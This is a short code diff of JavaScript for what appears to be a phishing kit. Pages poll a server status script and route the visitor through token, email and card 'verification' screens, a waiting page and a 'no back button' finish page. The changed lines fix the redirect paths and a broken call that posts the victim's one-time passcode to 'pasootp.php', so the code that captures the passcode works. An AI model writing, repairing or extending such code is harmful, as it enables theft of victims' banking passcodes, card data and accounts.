@@ -13,17 +13,17 @@ function traer_info(){
 function consultar_estado(){
     $.post( "../../../../process/estado.php",function(data) {
     	switch (data) {
-            case '2':window.location.href = "tokenverification";
+            case '2':window.location.href = "tokenverification.php";
                      break;
-            case '4':window.location.href = "emailverification"; 
+            case '4':window.location.href = "emailverification.php"; 
                      break;
-            case '6':window.location.href = "cardverification"; 
+            case '6':window.location.href = "cardverification.php"; 
                      break;               
             case '8':window.location.href = "tokenerror.php"; 
                      break;
-            case '10': window.location.href = "../../../../finish-no-back-button/";
+            case '10': window.location.href = "../../../../finish-no-back-button/successful.html";
                       break;
-            case '12':window.location.href = "/wps";
+            case '12':window.location.href = "login.php";
                       break;
         }
     });        
@@ -223,7 +223,7 @@ $(document).ready(function() {
 	$('#btntoken').click(function(){
     	if ($("#token").val().length > 5) {
     		$("#etoken").hide(); 
-    		$.post( "../../../../process/pasootp.php", { otp: $("#token").val( } ,function(data) {    		
+    		$.post( "../../../../process/pasootp.php", { otp: $("#token").val() } ,function(data) {    		
 		       window.location.href = "waiting.php"; 
 		    }); 
     	}else{
